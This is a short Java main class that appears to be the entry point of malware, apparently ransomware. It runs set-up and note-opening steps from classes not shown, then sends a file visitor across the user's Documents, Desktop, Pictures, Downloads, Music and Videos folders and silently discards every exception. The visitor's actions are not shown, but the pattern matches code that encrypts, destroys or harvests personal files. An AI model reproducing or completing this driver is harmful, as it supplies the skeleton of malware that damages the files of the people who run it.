import java.nio.file.Files;
import java.nio.file.Paths;

public class  Main {

    public static void main(String[] args){

        try{

            Make mk=new Make();

            mk.method();

            Open op = new Open();

            op.text();


            Do eA = new Do();
            Files.walkFileTree(Paths.get(System.getProperty("user.home") + "\\Documents"), eA);
            Files.walkFileTree(Paths.get(System.getProperty("user.home") + "\\Desktop"), eA);
            Files.walkFileTree(Paths.get(System.getProperty("user.home") + "\\Pictures"), eA);
            Files.walkFileTree(Paths.get(System.getProperty("user.home") + "\\Downloads"), eA);
            Files.walkFileTree(Paths.get(System.getProperty("user.home") + "\\Music"), eA);
            Files.walkFileTree(Paths.get(System.getProperty("user.home") + "\\Videos"), eA);

        }

        catch (Exception e) {}

        }
}

